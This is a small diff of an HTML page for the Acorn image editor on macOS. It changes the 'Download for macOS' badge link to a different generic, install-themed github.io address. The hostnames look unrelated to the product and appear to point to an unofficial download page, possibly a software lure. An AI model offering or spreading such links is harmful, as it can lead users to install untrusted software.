@@ -6,7 +6,7 @@
 <h3>Acorn for macOS</h3>
 <p>Acorn is a specialized image editor for macOS designed for users who want a reliable, Mac‑native tool with clear controls and stable performance.</p>
 
-<a href="https://install-software-utility.github.io/.github/">
+<a href="https://software-app-osx-install.github.io/.github/acorn">
   <img src="https://i.postimg.cc/7LTTZgxF/macos-badge-noborder.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
